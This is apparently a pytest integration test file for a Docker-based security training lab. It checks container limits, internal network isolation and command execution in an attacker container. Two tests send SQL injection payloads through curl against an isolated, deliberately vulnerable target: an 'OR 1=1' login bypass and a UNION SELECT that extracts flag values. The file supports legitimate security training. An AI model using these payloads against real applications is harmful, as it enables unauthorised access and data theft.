"""
Comprehensive Integration Tests for NO ENTRY Genuine Docker Lab Runtime.
Explicitly exercises:
1. Docker detection & status categorization (DOCKER_AVAILABLE, DOCKER_UNAVAILABLE, DOCKER_STARTING, etc.)
2. Real container creation with strict security bounds (256m RAM, 0.5 CPUs, pids-limit 64, no-new-privileges)
3. Internal bridge network isolation (verifying no internet egress)
4. Terminal interaction executing whoami, pwd, ip addr, ls, and curl inside the real attacker container
5. End-to-end SQL injection exploitation against the isolated target container
6. Container and network teardown lifecycle
"""

import asyncio
import pytest
from backend.app.labs.base import DockerStatus, DockerRuntimeError
from backend.app.labs.docker_runner import DockerLabRunner, find_docker_binary


@pytest.fixture(scope="module")
def docker_runner():
    runner = DockerLabRunner()
    if not runner.is_available():
        pytest.skip("Docker daemon is not operational on this host. Skipping real Docker integration tests.")
    return runner


def test_docker_environment_detection(docker_runner):
    """Verify Docker detection identifies DOCKER_AVAILABLE and reports proper diagnostics."""
    status, msg, guidance = docker_runner.check_docker_status()
    assert status == DockerStatus.DOCKER_AVAILABLE
    assert "operational" in msg.lower() or "desktop" in msg.lower()
    assert guidance == ""

    # Verify binary location is discovered
    bin_path = find_docker_binary()
    assert bin_path is not None
    assert "docker" in bin_path.lower()


@pytest.mark.asyncio
async def test_real_docker_lab_lifecycle_and_security_constraints(docker_runner):
    """
    Test real Docker lab lifecycle:
    - Dedicated network with --internal (no internet egress)
    - Target container and attacker container with 256m RAM, 0.5 CPU, 64 PIDs
    - Real command execution: whoami, pwd, ip addr, ls
    - Network isolation verification (outbound ping/curl to public internet blocked)
    """
    session_id = "test_real_docker_sess_01"

    # Start session
    info = await docker_runner.start_session(session_id, "red-09-sqli-fundamentals", "op-real-tester")
    assert info.status == "RUNNING"
    assert info.runner_mode == "docker"
    assert info.docker_available is True
    assert info.docker_status == DockerStatus.DOCKER_AVAILABLE
    assert info.attacker_container_id is not None
    assert info.target_container_id is not None
    assert info.network_id is not None

    try:
        # 1. whoami inside attacker container (must run as non-root operator)
        whoami = await docker_runner.execute_command(session_id, "whoami")
        assert whoami.strip() == "operator"

        # 2. pwd inside attacker container (must be /home/operator)
        pwd = await docker_runner.execute_command(session_id, "pwd")
        assert pwd.strip() == "/home/operator"

        # 3. ip addr (must show lo and internal bridge interface)
        ip_out = await docker_runner.execute_command(session_id, "ip addr")
        assert "eth0" in ip_out
        assert "10.10." in ip_out

        # 4. ls inside container
        ls_out = await docker_runner.execute_command(session_id, "ls -la")
        assert "entrypoint.sh" in ls_out or "." in ls_out

        # 5. Verify network isolation: outbound internet request must fail due to --internal
        egress_check = await docker_runner.execute_command(
            session_id, "curl -m 2 -s http://1.1.1.1 || echo EGRESS_BLOCKED"
        )
        assert "EGRESS_BLOCKED" in egress_check or "timed out" in egress_check.lower() or egress_check.strip() == ""

        # 6. Verify internal connectivity to target application
        index_html = await docker_runner.execute_command(
            session_id, f"curl -s http://{info.target_ip}:{info.target_port}/"
        )
        assert "VoltGear" in index_html

        # 7. Execute SQL Injection Auth Bypass against real target container
        auth_bypass = await docker_runner.execute_command(
            session_id,
            f'curl -s -X POST -d "username=admin\' OR 1=1 --&password=x" http://{info.target_ip}:{info.target_port}/login',
        )
        assert "NOENTRY{sqli_auth_bypass_success_3914}" in auth_bypass

        # 8. Execute UNION SELECT Data Exfiltration against real target container
        union_res = await docker_runner.execute_command(
            session_id,
            f'curl -s "http://{info.target_ip}:{info.target_port}/search?q=\'%20UNION%20SELECT%201,flag_name,flag_value,4%20FROM%20hidden_flags%20--"',
        )
        assert "NOENTRY{union_sqli_data_extraction_7129}" in union_res

        # 9. Reset session
        reset_info = await docker_runner.reset_session(session_id)
        assert reset_info.status == "RUNNING"

    finally:
        # Teardown and destroy containers and network
        stopped = await docker_runner.stop_session(session_id)
        assert stopped is True


@pytest.mark.asyncio
async def test_docker_runner_timeout_handling(docker_runner):
    """Verify that commands that hang or run indefinitely are cleanly timed out after 15s."""
    session_id = "test_docker_timeout_sess_02"
    info = await docker_runner.start_session(session_id, "red-09-sqli-fundamentals", "op-timeout-tester")

    try:
        # Run a sleep command that exceeds timeout
        res = await docker_runner.execute_command(session_id, "sleep 30")
        assert "timed out" in res.lower()
    finally:
        await docker_runner.stop_session(session_id)

